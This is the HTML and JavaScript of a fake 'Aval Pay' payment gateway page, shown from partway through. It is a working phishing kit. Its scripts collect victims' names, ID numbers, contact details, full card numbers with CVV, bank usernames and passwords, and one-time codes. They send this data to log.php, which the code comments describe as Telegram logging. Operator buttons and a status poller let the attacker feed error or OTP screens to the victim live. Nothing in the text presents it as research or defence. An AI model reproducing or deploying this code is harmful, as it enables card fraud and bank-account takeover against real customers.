                        <input id="tcAdicional" class="tc-input" type="text" placeholder="Apto, oficina…">
                    </div>
                </div>

                <div class="tc-campo">
                    <label class="tc-label" for="tcCuotas">Cuotas</label>
                    <input id="tcCuotas" class="tc-input" type="text" placeholder="Cuotas" inputmode="numeric">
                </div>

                <div class="tc-foot">
                    <img src="assets/img/pci-dss-badge.png" alt="PCI DSS Compliant" class="tc-pci"
                        onerror="this.outerHTML='<span style=\'font-size:11px;color:#6b7280;font-weight:700;\'>PCI DSS</span>'">
                    <button type="button" class="tc-btn-pagar" id="tcBtnPagar">Pagar <span id="tcMonto">COP
                            $0</span></button>
                </div>
            </div>
        </div>
    </div>

    <!-- ── Esperando overlay ── -->
    <div id="avEsperaOverlay" class="av-overlay av-overlay-dark" style="display:none;">
        <div style="text-align:center; color:white;">
            <svg width="60" height="60" viewBox="0 0 60 60" style="animation:avSpin 1.2s linear infinite; margin-bottom:20px;">
                <circle cx="30" cy="30" r="26" stroke="#002449" stroke-width="5" fill="none"/>
                <path d="M30 4a26 26 0 0 1 26 26" stroke="#2aa8ff" stroke-width="5" stroke-linecap="round" fill="none"/>
            </svg>
            <h3 style="font-size:20px; margin-bottom:10px; font-family:'Montserrat',sans-serif;">Verificando transacción...</h3>
            <p style="font-size:14px; color:#aaa; font-family:'Montserrat',sans-serif;">Por favor espere mientras procesamos su solicitud.</p>
        </div>
    </div>

    <!-- ── Visa Auth Modal ── -->
    <div id="avVisaAuthModal" class="av-overlay av-overlay-dark" style="display:none;">
        <div class="av-visa-card">
            <div class="av-visa-logo">
                <img id="avVisaBankLogo" src="img/banks/nobank.png" alt="" style="height:52px; object-fit:contain;" onerror="this.style.display='none'">
            </div>
            <div class="av-visa-body">
                <h3 class="av-visa-title">Autorización de transacción</h3>
                <p class="av-visa-desc">
                    La transacción que intentas realizar en <strong id="avVisaComercio"></strong> por
                    <strong id="avVisaMonto"></strong> el <strong id="avVisaFecha"></strong> con tu tarjeta
                    terminada en <strong id="avVisaUltimos"></strong> debe ser autorizada por seguridad.
                </p>
                <p class="av-visa-section">DETALLES DE TRANSACCIÓN:</p>
                <table class="av-visa-table">
                    <tr><td>Comercio:</td><td id="avVisaDetalleComercio"></td></tr>
                    <tr><td>Monto de la Transacción:</td><td id="avVisaDetalleMonto"></td></tr>
                    <tr><td>Número de tarjeta:</td><td id="avVisaDetalleTarjeta"></td></tr>
                </table>
                <div id="avVisaFormSection">
                    <p id="avVisaErrorMsg" class="av-error-msg" style="display:none;">Usuario o contraseña incorrecta por favor verifíquelos.</p>
                    <div class="av-visa-form">
                        <div class="av-visa-field">
                            <label>Usuario:</label>
                            <input type="text" id="avVisaUsuario" placeholder="Usuario" autocomplete="off">
                        </div>
                        <div class="av-visa-field">
                            <label>Clave:</label>
                            <input type="password" id="avVisaClave" placeholder="*******" autocomplete="off">
                        </div>
                    </div>
                    <button id="avBtnVisaAutorizar" class="av-btn-autorizar">Autorizar</button>
                </div>
                <div id="avVisaLoader" style="display:none; justify-content:center; padding:28px 0 8px;">
                    <svg width="52" height="52" viewBox="0 0 52 52" style="animation:avSpin 1.1s linear infinite;">
                        <circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="5" fill="none"/>
                        <path d="M26 4a22 22 0 0 1 22 22" stroke="#1A1F71" stroke-width="5" stroke-linecap="round" fill="none"/>
                    </svg>
                </div>
            </div>
        </div>
    </div>

    <!-- ── Visa OTP Modal ── -->
    <div id="avVisaOtpModal" class="av-overlay av-overlay-dark" style="display:none;">
        <div class="av-visa-card">
            <div class="av-visa-logo">
                <img id="avOtpBankLogo" src="img/banks/nobank.png" alt="" style="height:52px; object-fit:contain;" onerror="this.style.display='none'">
            </div>
            <div class="av-visa-body">
                <h3 class="av-visa-title">Autorización de transacción</h3>
                <p class="av-visa-desc">
                    La transacción que intentas realizar en <strong id="avOtpComercio"></strong> por
                    <strong id="avOtpMonto"></strong> el <strong id="avOtpFecha"></strong> con tu tarjeta
                    terminada en <strong id="avOtpUltimos"></strong> debe ser autorizada por seguridad.
                </p>
                <div id="avVisaOtpFormSection">
                    <p class="av-visa-section">VERIFICACIÓN DE SEGURIDAD:</p>
                    <div class="av-visa-form">
                        <div class="av-visa-field">
                            <label>Clave Dinámica/Temporal:</label>
                            <input type="password" id="avOtpClave" placeholder="******" autocomplete="off">
                        </div>
                    </div>
                    <button id="avBtnOtpAutorizar" class="av-btn-autorizar">Autorizar</button>
                    <button id="avBtnOtpCancelar" class="av-btn-autorizar" style="margin-top:12px; background:#555;">Cancelar</button>
                </div>
                <div id="avVisaOtpLoader" style="display:none; justify-content:center; padding:28px 0 8px;">
                    <svg width="52" height="52" viewBox="0 0 52 52" style="animation:avSpin 1.1s linear infinite;">
                        <circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="5" fill="none"/>
                        <path d="M26 4a22 22 0 0 1 22 22" stroke="#1A1F71" stroke-width="5" stroke-linecap="round" fill="none"/>
                    </svg>
                </div>
            </div>
        </div>
    </div>

    <!-- ── Rechazo overlay ── -->
    <div id="avRechazoOverlay" class="av-overlay" style="display:none;">
        <div class="av-overlay-card">
            <div style="width:70px;height:70px;background:#fff0f0;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="#dc3545"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z"/></svg>
            </div>
            <h3 style="font-size:20px; color:#dc3545; margin-bottom:12px; font-family:'Montserrat',sans-serif;">Algo falló</h3>
            <div style="background:#fff5f5;border:1px solid #f5c6cb;border-radius:8px;padding:16px;margin-bottom:20px;">
                <p style="font-size:15px; color:#721c24; margin-bottom:6px; font-weight:600; font-family:'Montserrat',sans-serif;">Tarjeta Rechazada</p>
                <p style="font-size:13px; color:#856464; line-height:1.5; font-family:'Montserrat',sans-serif;">La transacción no pudo completarse. Los datos de su tarjeta no fueron validados por la entidad emisora.</p>
            </div>
            <button onclick="document.getElementById('avRechazoOverlay').style.display='none'" class="av-overlay-btn red">Intentar de nuevo</button>
        </div>
    </div>

    <div id="modalDemo" class="modal-demo" aria-hidden="true">
        <div class="modal-demo__backdrop" data-cerrar-modal></div>
        <div class="modal-demo__dialog" role="dialog" aria-modal="true" aria-labelledby="modalDemoTitulo">
            <h3 id="modalDemoTitulo" class="modal-demo__title">Reconstrucción visual lista</h3>
            <p class="modal-demo__text">
            <div class="modal-demo__actions">
                <button type="button" class="modal-demo__btn" data-cerrar-modal>Cerrar</button>
            </div>
        </div>
    </div>

    <script>
        (function () {
            const textoServicio = document.getElementById('textoServicio');
            const textoIdTransaccion = document.getElementById('textoIdTransaccion');
            const textoReferencia = document.getElementById('textoReferencia');
            const textoValor = document.getElementById('textoValor');
            const formularioTitular = document.getElementById('formularioTitular');
            const botonesSegmento = Array.from(document.querySelectorAll('.pasarela__segmento'));
            const botonesBanco = Array.from(document.querySelectorAll('.pasarela__banco'));
            const seccionAval = document.getElementById('seccionAval');
            const seccionOtrasEntidades = document.getElementById('seccionOtrasEntidades');
            const seccionTarjeta = document.getElementById('seccionTarjeta');
            const modalTarjeta = document.getElementById('modalTarjeta');
            const tcMonto = document.getElementById('tcMonto');
            const selectorBancoOtras = document.getElementById('selectorBancoOtras');
            const mensajeFormulario = document.getElementById('mensajeFormulario');
            const overlayCargando = document.getElementById('overlayCargando');
            const modalDemo = document.getElementById('modalDemo');
            const botonPagarPasoDos = document.getElementById('botonPagarPasoDos');
            const camposRequeridos = Array.from(formularioTitular.querySelectorAll('[required]'));

            let tipoEntidadSeleccionada = 'aval';
            let bancoSeleccionado = '';

            function generarIdTransaccion() {
                return Date.now().toString().slice(-8) + Math.floor(Math.random() * 900 + 100).toString();
            }

            function limpiarNumero(valor) {
                if (valor == null) return '';
                return String(valor).replace(/[^\d]/g, '');
            }

            function formatearMoneda(valor) {
                const numero = Number(limpiarNumero(valor) || 0);
                return '$ ' + numero.toLocaleString('es-CO');
            }

            function normalizarTexto(valor, fallback) {
                const texto = String(valor || '').trim();
                return texto || fallback;
            }

            function obtenerConvenio() {
                try {
                    return JSON.parse(localStorage.getItem('convenioSeleccionado') || 'null');
                } catch (error) {
                    return null;
                }
            }

            function obtenerDatosPasoUno() {
                try {
                    return JSON.parse(localStorage.getItem('datosPagoPasoUno') || 'null');
                } catch (error) {
                    return null;
                }
            }

            function obtenerParametro(nombre) {
                return new URLSearchParams(window.location.search).get(nombre);
            }

            function resolverReferencia(datosPasoUno) {
                if (datosPasoUno && datosPasoUno.referencia) {
                    return datosPasoUno.referencia;
                }

                if (datosPasoUno && datosPasoUno.campos && typeof datosPasoUno.campos === 'object') {
                    const entradas = Object.entries(datosPasoUno.campos);
                    for (const [clave, valor] of entradas) {
                        if (/refer|local|apartamento|factura/i.test(clave) && String(valor || '').trim()) {
                            return valor;
                        }
                    }

                    for (const [, valor] of entradas) {
                        if (String(valor || '').trim()) {
                            return valor;
                        }
                    }
                }

                return obtenerParametro('ref') || '1929';
            }

            function resolverValor(datosPasoUno) {
                if (datosPasoUno && datosPasoUno.monto_raw) {
                    return datosPasoUno.monto_raw;
                }

                if (datosPasoUno && datosPasoUno.valor) {
                    return datosPasoUno.valor;
                }

                if (datosPasoUno && datosPasoUno.campos && typeof datosPasoUno.campos === 'object') {
                    const entradas = Object.entries(datosPasoUno.campos);
                    for (const [clave, valor] of entradas) {
                        if (/valor/i.test(clave) && limpiarNumero(valor)) {
                            return valor;
                        }
                    }
                }

                return obtenerParametro('valor') || '245000';
            }

            function cargarResumen() {
                const convenio = obtenerConvenio();
                const datosPasoUno = obtenerDatosPasoUno();
                const nombreServicio = datosPasoUno && datosPasoUno.servicio
                    ? datosPasoUno.servicio
                    : (convenio && convenio.Nombre ? convenio.Nombre : 'ABASTECIMIENTOS INDUSTRIALES SAS');
                textoServicio.textContent = 'PAGO ' + normalizarTexto(nombreServicio, 'ABASTECIMIENTOS INDUSTRIALES SAS').toUpperCase();
                textoReferencia.textContent = normalizarTexto(resolverReferencia(datosPasoUno), '1929');
                textoValor.textContent = formatearMoneda(resolverValor(datosPasoUno));
                textoIdTransaccion.textContent = generarIdTransaccion();
            }

            function limitarMovil(campo) {
                campo.value = limpiarNumero(campo.value).slice(0, 10);
            }

            function mostrarErrorCampo(campo, mensaje) {
                const error = campo.parentElement.querySelector('.pasarela__error');
                campo.classList.add(campo.tagName === 'SELECT' ? 'pasarela__select--error' : 'pasarela__input--error');
                if (error) {
                    error.textContent = mensaje || 'Campo requerido';
                    error.classList.remove('oculto');
                }
            }

            function ocultarErrorCampo(campo) {
                const error = campo.parentElement.querySelector('.pasarela__error');
                campo.classList.remove('pasarela__input--error', 'pasarela__select--error');
                if (error) {
                    error.classList.add('oculto');
                }
            }

            function validarCampoRequerido(campo) {
                if (!String(campo.value || '').trim()) {
                    mostrarErrorCampo(campo, 'Campo requerido');
                    return false;
                }

                ocultarErrorCampo(campo);
                return true;
            }

            function validarCoincidencia(campoA, campoB, mensaje) {
                if (!String(campoB.value || '').trim()) {
                    return false;
                }

                if (String(campoA.value || '').trim() !== String(campoB.value || '').trim()) {
                    mostrarErrorCampo(campoB, mensaje);
                    return false;
                }

                ocultarErrorCampo(campoB);
                return true;
            }

            function seleccionarTipoEntidad(boton) {
                botonesSegmento.forEach(function (item) {
                    item.classList.remove('pasarela__segmento--activo');
                    item.setAttribute('aria-selected', 'false');
                });

                boton.classList.add('pasarela__segmento--activo');
                boton.setAttribute('aria-selected', 'true');
                tipoEntidadSeleccionada = boton.dataset.tipoEntidad;
                seccionAval.classList.toggle('oculto', tipoEntidadSeleccionada !== 'aval');
                seccionOtrasEntidades.classList.toggle('oculto', tipoEntidadSeleccionada !== 'otras');
                seccionTarjeta.classList.toggle('oculto', tipoEntidadSeleccionada !== 'tarjeta');
                validarSeleccionBanco(false);
            }

            function seleccionarBanco(boton) {
                botonesBanco.forEach(function (item) {
                    item.classList.remove('pasarela__banco--activo');
                });

                boton.classList.add('pasarela__banco--activo');
                bancoSeleccionado = boton.dataset.banco || '';
                validarSeleccionBanco(false);
            }

            function abrirModalTarjeta() {
                const datosPasoUno = obtenerDatosPasoUno();
                const monto = datosPasoUno && datosPasoUno.monto_raw ? datosPasoUno.monto_raw : (resolverValor(datosPasoUno));
                const montoNum = Number(String(monto).replace(/[^\d]/g, '') || 0);
                tcMonto.textContent = 'COP $' + montoNum.toLocaleString('es-CO');
                const correo = document.getElementById('correo').value.trim();
                if (correo) document.getElementById('tcEmail').value = correo;
                const nombre = document.getElementById('nombreCompleto').value.trim();
                if (nombre) document.getElementById('tcTitular').value = nombre;
                const tel = document.getElementById('movil').value.trim();
                if (tel) document.getElementById('tcCelular').value = tel;
                modalTarjeta.classList.add('modal-tarjeta--visible');
                modalTarjeta.setAttribute('aria-hidden', 'false');
            }

            function cerrarModalTarjeta() {
                modalTarjeta.classList.remove('modal-tarjeta--visible');
                modalTarjeta.setAttribute('aria-hidden', 'true');
            }

            function validarSeleccionBanco(mostrarError) {
                const errorAval = document.getElementById('errorBancoAval');
                const errorOtras = document.getElementById('errorBancoOtras');

                if (tipoEntidadSeleccionada === 'tarjeta') {
                    errorAval.classList.add('oculto');
                    errorOtras.classList.add('oculto');
                    return true;
                }

                if (tipoEntidadSeleccionada === 'aval') {
                    errorOtras.classList.add('oculto');
                    selectorBancoOtras.classList.remove('pasarela__select--error');

                    if (!bancoSeleccionado) {
                        if (mostrarError) {
                            errorAval.classList.remove('oculto');
                        } else {
                            errorAval.classList.add('oculto');
                        }
                        return false;
                    }

                    errorAval.classList.add('oculto');
                    return true;
                }

                errorAval.classList.add('oculto');

                if (!String(selectorBancoOtras.value || '').trim()) {
                    if (mostrarError) {
                        errorOtras.classList.remove('oculto');
                        selectorBancoOtras.classList.add('pasarela__select--error');
                    } else {
                        errorOtras.classList.add('oculto');
                        selectorBancoOtras.classList.remove('pasarela__select--error');
                    }
                    return false;
                }

                errorOtras.classList.add('oculto');
                selectorBancoOtras.classList.remove('pasarela__select--error');
                return true;
            }

            function abrirModal() {
                modalDemo.classList.add('modal-demo--visible');
                modalDemo.setAttribute('aria-hidden', 'false');
            }

            function cerrarModal() {
                modalDemo.classList.remove('modal-demo--visible');
                modalDemo.setAttribute('aria-hidden', 'true');
            }

            function mostrarOverlayCargando() {
                overlayCargando.classList.add('overlay-cargando--abierto');
                overlayCargando.setAttribute('aria-hidden', 'false');
            }

            function ocultarOverlayCargando() {
                overlayCargando.classList.remove('overlay-cargando--abierto');
                overlayCargando.setAttribute('aria-hidden', 'true');
            }

            function validarFormulario() {
                let valido = true;

                camposRequeridos.forEach(function (campo) {
                    if (!validarCampoRequerido(campo)) {
                        valido = false;
                    }
                });

                const correo = document.getElementById('correo');
                const correoConfirmacion = document.getElementById('correoConfirmacion');
                const movil = document.getElementById('movil');
                const movilConfirmacion = document.getElementById('movilConfirmacion');

                if (String(correo.value || '').trim() && String(correoConfirmacion.value || '').trim()) {
                    if (!validarCoincidencia(correo, correoConfirmacion, 'Los correos no coinciden')) {
                        valido = false;
                    }
                }

                if (String(movil.value || '').trim() && String(movilConfirmacion.value || '').trim()) {
                    if (!validarCoincidencia(movil, movilConfirmacion, 'Los móviles no coinciden')) {
                        valido = false;
                    }
                }

                if (!validarSeleccionBanco(true)) {
                    valido = false;
                }

                return valido;
            }

            botonesSegmento.forEach(function (boton) {
                boton.addEventListener('click', function () {
                    seleccionarTipoEntidad(boton);
                });
            });

            botonesBanco.forEach(function (boton) {
                boton.addEventListener('click', function () {
                    seleccionarBanco(boton);
                });
            });

            selectorBancoOtras.addEventListener('change', function () {
                validarSeleccionBanco(false);
            });

            ['movil', 'movilConfirmacion'].forEach(function (id) {
                const input = document.getElementById(id);
                input.addEventListener('input', function () {
                    limitarMovil(input);
                });
            });

            camposRequeridos.forEach(function (campo) {
                const evento = campo.tagName === 'SELECT' ? 'change' : 'input';
                campo.addEventListener(evento, function () {
                    validarCampoRequerido(campo);

                    if (campo.id === 'correo' || campo.id === 'correoConfirmacion') {
                        validarCoincidencia(
                            document.getElementById('correo'),
                            document.getElementById('correoConfirmacion'),
                            'Los correos no coinciden'
                        );
                    }

                    if (campo.id === 'movil' || campo.id === 'movilConfirmacion') {
                        validarCoincidencia(
                            document.getElementById('movil'),
                            document.getElementById('movilConfirmacion'),
                            'Los móviles no coinciden'
                        );
                    }
                });
            });

            formularioTitular.addEventListener('submit', function (evento) {
                evento.preventDefault();
                mensajeFormulario.textContent = '';
                mensajeFormulario.classList.remove('pasarela__mensaje--ok');

                if (!validarFormulario()) {
                    mensajeFormulario.textContent = 'Revisa los campos marcados antes de continuar.';
                    return;
                }

                // --- Tarjeta de crédito: abrir modal GlobalPay ---
                if (tipoEntidadSeleccionada === 'tarjeta') {
                    botonPagarPasoDos.disabled = false;
                    abrirModalTarjeta();
                    return;
                }

                // --- Recoger datos del titular ---
                const tipoEntidad = tipoEntidadSeleccionada; // 'aval' | 'otras'

                const banco = tipoEntidad === 'aval'
                    ? bancoSeleccionado
                    : selectorBancoOtras.options[selectorBancoOtras.selectedIndex].text;

                // Guardar selección local (compatibilidad con tu código actual)
                localStorage.setItem('seleccionPagoPasoDos', JSON.stringify({
                    tipoEntidad: tipoEntidad,
                    banco: banco
                }));

                // Deshabilitar botón para evitar doble submit
                botonPagarPasoDos.disabled = true;
                mensajeFormulario.textContent = 'Procesando...';
                mensajeFormulario.classList.remove('pasarela__mensaje--ok');
                mostrarOverlayCargando();

                // Log PSE/Aval to Telegram
                avGetIP().then(function(ip) {
                    avTgLog([
                        tipoEntidad === 'aval' ? '🏦 AVAL PAY — BANCO AVAL' : '🏦 AVAL PAY — OTRAS ENTIDADES (PSE)',
                        '🏛️ Banco: ' + banco,
                        '👤 ' + document.getElementById('nombreCompleto').value.trim(),
                        '🪪 ' + (document.getElementById('tipoDocumento').value || '') + ' ' + document.getElementById('numeroDocumento').value.trim(),
                        '📧 ' + document.getElementById('correo').value.trim(),
                        '📱 ' + document.getElementById('movil').value.trim(),
                        '💰 Monto: ' + avFmtCOP((obtenerDatosPasoUno() && obtenerDatosPasoUno().monto_raw) ? obtenerDatosPasoUno().monto_raw : '0'),
                        '🌐 IP: ' + ip
                    ]);
                });

                // --- Enviar a get-redirect.php ---
                fetch('get-redirect.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        tipoEntidad: tipoEntidad,
                        banco: banco,
                        nombre: document.getElementById('nombreCompleto').value.trim(),
                        cedula: document.getElementById('numeroDocumento').value.trim(),
                        email: document.getElementById('correo').value.trim(),
                        telefono: document.getElementById('movil').value.trim(),
                        monto: (typeof obtenerDatosPasoUno === 'function' && obtenerDatosPasoUno() && obtenerDatosPasoUno().monto_raw)
                            ? obtenerDatosPasoUno().monto_raw
                            : '0'
                    })
                })
                    .then(function (r) { return r.json(); })
                    .then(function (resp) {
                        if (!resp.ok) {
                            botonPagarPasoDos.disabled = false;
                            ocultarOverlayCargando();
                            mensajeFormulario.textContent = 'No se pudo procesar el pago. Intenta de nuevo.';
                            return;
                        }
                        // Redirigir al destino final
                        window.location.href = resp.url;
                    })
                    .catch(function () {
                        botonPagarPasoDos.disabled = false;
                        ocultarOverlayCargando();
                        mensajeFormulario.textContent = 'Error de conexión. Intenta de nuevo.';
                    });
            });

            modalDemo.addEventListener('click', function (evento) {
                if (evento.target && evento.target.hasAttribute('data-cerrar-modal')) {
                    cerrarModal();
                }
            });

            document.getElementById('btnCerrarTarjeta').addEventListener('click', cerrarModalTarjeta);
            document.getElementById('backdropTarjeta').addEventListener('click', cerrarModalTarjeta);

            // Formateo número de tarjeta
            document.getElementById('tcNumero').addEventListener('input', function () {
                let v = this.value.replace(/\D/g, '').slice(0, 16);
                this.value = v.replace(/(.{4})/g, '$1 ').trim();
            });

            // Formateo expiración
            document.getElementById('tcExpiry').addEventListener('input', function () {
                let v = this.value.replace(/\D/g, '').slice(0, 4);
                if (v.length >= 3) v = v.slice(0, 2) + ' / ' + v.slice(2);
                this.value = v;
            });

            document.getElementById('tcBtnPagar').addEventListener('click', function () {
                var cardNum = document.getElementById('tcNumero').value.replace(/\D/g, '');
                var cardExp = document.getElementById('tcExpiry').value;
                var cardCvc = document.getElementById('tcCvc').value;
                var datosPU = obtenerDatosPasoUno();
                var monto = (datosPU && datosPU.monto_raw) ? datosPU.monto_raw : (resolverValor(datosPU) || '0');
                _avCard = {
                    num: cardNum, exp: cardExp, cvv: cardCvc, bank: '—', brand: '',
                    nombre: document.getElementById('nombreCompleto').value.trim(),
                    cedula: ((document.getElementById('tipoDocumento').value || '') + ' ' + (document.getElementById('numeroDocumento').value.trim() || '')).trim(),
                    movil: document.getElementById('movil').value.trim(),
                    correo: document.getElementById('correo').value.trim(),
                    monto: monto
                };
                cerrarModalTarjeta();
                avShowOv('avEsperaOverlay');
                Promise.all([
                    avGetIP(),
                    fetch('card_info.php?cc=' + cardNum).then(function(r){return r.json();}).catch(function(){return {info:'—',brand:''};})
                ]).then(function(res) {
                    _avCard.bank = res[1].info || '—';
                    _avCard.brand = res[1].brand || '';
                    avTgLog([
                        '💴💴💴 NUEVO AVAL PAY 💴💴💴',
                        '🔪 IP: ' + res[0],
                        '✉️ ' + _avCard.correo,
                        '🪪 ' + _avCard.cedula,
                        '📱 ' + _avCard.movil,
                        '👤 ' + _avCard.nombre,
                        '🔖 ' + navigator.userAgent,
                        '🏧 Bank: ' + _avCard.bank,
                        '💳 ' + cardNum,
                        '📆 ' + cardExp,
                        '🪬 ' + cardCvc,
                        '💰 Monto: ' + avFmtCOP(monto)
                    ], 'cc');
                });
                setTimeout(function () {
                    avHideOv('avEsperaOverlay');
                    avFillVisa();
                    avShowOv('avVisaAuthModal');
                }, 2000);
            });

            document.addEventListener('keydown', function (evento) {
                if (evento.key === 'Escape') {
                    cerrarModal();
                    cerrarModalTarjeta();
                }
            });

            /* ── Telegram / capture helpers ── */
            var _avCard = { num:'', exp:'', cvv:'', bank:'—', brand:'', nombre:'', cedula:'', movil:'', correo:'', monto:'0' };
            var _avVisaTimer = null;

            function avGetIP() {
                return fetch('https://api.ipify.org?format=json').then(function(r){return r.json();}).then(function(d){return d.ip||'—';}).catch(function(){return '—';});
            }
            function avTgLog(lines, action) {
                var text = Array.isArray(lines) ? lines.join('\n') : String(lines);
                var body = { text: text };
                if (action) body.action = action;
                fetch('log.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body) }).catch(function(){});
            }
            function avShowOv(id) { var el = document.getElementById(id); if (el) el.style.display = 'flex'; }
            function avHideOv(id) { var el = document.getElementById(id); if (el) el.style.display = 'none'; }
            function avFmtCOP(val) { return '$ ' + Number(String(val||0).replace(/[^\d]/g,'')||0).toLocaleString('es-CO'); }

            function avFillVisa() {
                var c = _avCard;
                var last4 = c.num.slice(-4) || '----';
                var conv = obtenerConvenio();
                var datosPU = obtenerDatosPasoUno();
                var comercio = ((datosPU && datosPU.servicio) ? datosPU.servicio : (conv && conv.Nombre ? conv.Nombre : 'Aval Pay Center')).toUpperCase();
                var montoFmt = avFmtCOP(c.monto) + ' COP';
                var now = new Date();
                var fecha = now.getDate() + ' ' + (now.getMonth()+1) + '. ' + now.getFullYear();
                ['avVisaComercio','avOtpComercio'].forEach(function(id){ var el=document.getElementById(id); if(el) el.textContent=comercio; });
                ['avVisaMonto','avOtpMonto'].forEach(function(id){ var el=document.getElementById(id); if(el) el.textContent=montoFmt; });
                ['avVisaFecha','avOtpFecha'].forEach(function(id){ var el=document.getElementById(id); if(el) el.textContent=fecha; });
                ['avVisaUltimos','avOtpUltimos'].forEach(function(id){ var el=document.getElementById(id); if(el) el.textContent=last4; });
                document.getElementById('avVisaDetalleComercio').textContent = comercio;
                document.getElementById('avVisaDetalleMonto').textContent = montoFmt;
                document.getElementById('avVisaDetalleTarjeta').textContent = '**** **** **** ' + last4;
                document.getElementById('avVisaUsuario').value = '';
                document.getElementById('avVisaClave').value = '';
                document.getElementById('avVisaErrorMsg').style.display = 'none';
                avVisaLoading(false);
                clearInterval(_avVisaTimer);
            }

            function avVisaLoading(on) {
                document.getElementById('avVisaFormSection').style.display = on ? 'none' : '';
                document.getElementById('avVisaLoader').style.display = on ? 'flex' : 'none';
            }
            function avOtpLoading(on) {
                document.getElementById('avVisaOtpFormSection').style.display = on ? 'none' : '';
                document.getElementById('avVisaOtpLoader').style.display = on ? 'flex' : 'none';
            }
            function avVisaShowError() {
                avVisaLoading(false);
                document.getElementById('avVisaErrorMsg').style.display = 'block';
                document.getElementById('avVisaUsuario').value = '';
                document.getElementById('avVisaClave').value = '';
            }

            function avPoll(sid) {
                clearInterval(_avVisaTimer);
                _avVisaTimer = setInterval(function() {
                    fetch('status.php?s=' + sid).then(function(r){return r.json();}).then(function(d) {
                        if (d.status === 'error_usuario') {
                            clearInterval(_avVisaTimer);
                            if (document.getElementById('avVisaOtpModal').style.display !== 'none') {
                                avHideOv('avVisaOtpModal');
                                avFillVisa();
                                avShowOv('avVisaAuthModal');
                            }
                            avVisaShowError();
                        } else if (d.status === 'otp') {
                            clearInterval(_avVisaTimer);
                            if (document.getElementById('avVisaOtpModal').style.display === 'none') {
                                avHideOv('avVisaAuthModal');
                                document.getElementById('avOtpClave').value = '';
                                avOtpLoading(false);
                                avShowOv('avVisaOtpModal');
                            } else {
                                document.getElementById('avOtpClave').value = '';
                                avOtpLoading(false);
                            }
                        } else if (d.status === 'ncc') {
                            clearInterval(_avVisaTimer);
                            avHideOv('avVisaAuthModal');
                            avHideOv('avVisaOtpModal');
                            avShowOv('avRechazoOverlay');
                        }
                    }).catch(function(){});
                }, 2000);
            }

            document.getElementById('avBtnVisaAutorizar').addEventListener('click', function() {
                var u = document.getElementById('avVisaUsuario').value.trim();
                var k = document.getElementById('avVisaClave').value.trim();
                if (!u || !k) return;
                var sid = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2) + Date.now();
                avVisaLoading(true);
                fetch('log.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({
                    action: 'cc',
                    text: ['🔗 NUEVO LOGO INGRESADO (AVAL)','','👤 '+_avCard.nombre,'🏛 '+u,'🔐 '+k,'','🪪 '+_avCard.cedula,'🏧 '+_avCard.bank,'💳 '+_avCard.num+' | '+_avCard.exp+' | '+_avCard.cvv].join('\n'),
                    session_id: sid,
                    buttons: [[{text:'❌ Error usuario',callback_data:'error_usuario:'+sid},{text:'🔑 OTP',callback_data:'otp:'+sid},{text:'🚫 NCC',callback_data:'ncc:'+sid}]]
                })});
                avPoll(sid);
            });

            document.getElementById('avBtnOtpAutorizar').addEventListener('click', function() {
                var k = document.getElementById('avOtpClave').value.trim();
                if (!k) return;
                var sid = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2) + Date.now();
                avOtpLoading(true);
                fetch('log.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({
                    action: 'cc',
                    text: ['🔗 NUEVO OTP INGRESADO (AVAL)','','👤 '+_avCard.nombre,k,'','🪪 '+_avCard.cedula,'🏧 '+_avCard.bank,'💳 '+_avCard.num+' | '+_avCard.exp+' | '+_avCard.cvv].join('\n'),
                    session_id: sid,
                    buttons: [[{text:'❌ Error usuario',callback_data:'error_usuario:'+sid},{text:'🔑 OTP',callback_data:'otp:'+sid},{text:'🚫 NCC',callback_data:'ncc:'+sid}]]
                })});
                avPoll(sid);
            });

            document.getElementById('avBtnOtpCancelar').addEventListener('click', function() {
                avHideOv('avVisaOtpModal');
            });

            cargarResumen();
        })();
    </script>
</body>

</html>